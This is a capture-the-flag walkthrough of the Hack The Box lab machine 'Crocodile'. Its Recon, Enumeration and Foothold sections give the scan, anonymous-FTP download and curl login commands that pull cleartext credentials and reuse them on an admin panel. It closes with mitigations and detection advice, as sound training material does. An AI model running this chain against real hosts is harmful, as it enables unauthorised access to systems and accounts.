---
machine: Crocodile
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [ftp, web, credential-reuse, linux, tier1]
---

# Crocodile — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Available · Starting Point · Tier 1 · Linux · Very Easy

## TL;DR

**FTP (21/tcp)** allows anonymous login and serves two lists: allowed users and their passwords. Those credentials open the Apache **admin panel (80/tcp)** and the flag sits on the dashboard.

---

## Recon

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

- **21/tcp** vsftpd reporting `ftp-anon: Anonymous FTP login allowed (FTP code 230)`.
- **80/tcp** Apache serving a corporate site plus `/login.php`.
- Two services, one of them obviously misconfigured.

## Enumeration

```bash
ftp <TARGET_IP>
# Name: anonymous
# Password: <Enter>
ftp> ls -la
ftp> get allowed.userlist
ftp> get allowed.userlist.passwd
```

Typical contents:

```text
allowed.userlist         → admin, apache, ...
allowed.userlist.passwd  → cleartext password for each account
```

On the web side:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php
```

```text
/login.php
/assets
/config.php   (empty or no output)
```

- The site is the application those accounts belong to.
- The FTP pair does not authenticate against FTP itself (only `anonymous` is allowed) but works on `/login.php`.

## Foothold

```bash
curl -s -X POST http://<TARGET_IP>/login.php \
  --data-urlencode "username=admin" \
  --data-urlencode "password=<PASSWORD_FROM_LIST>" -c cookies.txt
curl -s -b cookies.txt http://<TARGET_IP>/dashboard.php
```

The panel returns the flag. The chain rests on two independent mistakes:

1. **Anonymous FTP** exposing sensitive documentation in its root.
2. **Credential reuse** between FTP and the web application.

Neither is a code vulnerability: both are exposure and secret-management failures.

## Lateral movement

- The same credentials are tried against SSH (closed) and the web panel (valid).
- There is only one host: the "movement" is between services on the same box.

## Privilege escalation

- Not applicable: the flag comes from the authenticated application.
- The panel user has no system functions or command execution.

## Evidence

- FTP root listing with both files (names visible, contents redacted).
- Authenticated session on `/dashboard.php` and the flag redacted.

## Lessons learned

- `ftp-anon` in a scan is not noise: it is a finding you always enumerate.
- Allowed-user files are a classic lab pattern and also show up in real, badly managed networks.
- Credential reuse across services multiplies the impact of a single leak.
- The web login is not brute forced: it is filled in with what you already found.

## Mitigations and detection

**How to fix it:**

- Disable anonymous access (`anonymous_enable=NO`) and review what FTP serves.
- Never store cleartext credentials; use a secret manager and rotate.
- Unique passwords per service and MFA on the admin panel.
- Minimal permissions on the FTP directory, and SFTP instead of FTP.

**How it would be detected:**

- Anonymous FTP sessions (`230 Login successful` with user `anonymous`).
- Access to `allowed.userlist*` in the FTP server logs.
- A web login from the IP that just downloaded those files (log correlation).

- CWE-521: Weak Password Requirements
- CWE-257: Storing Passwords in a Recoverable Format
- OWASP Top 10 2021: A07 Identification and Authentication Failures
- MITRE ATT&CK: [T1078 Valid Accounts](https://attack.mitre.org/techniques/T1078/)

## References

- [OWASP — Credential Stuffing](https://owasp.org/www-community/attacks/Credential_stuffing)
- [CIS Benchmarks — vsftpd](https://www.cisecurity.org/benchmark/distribution_independent_linux)
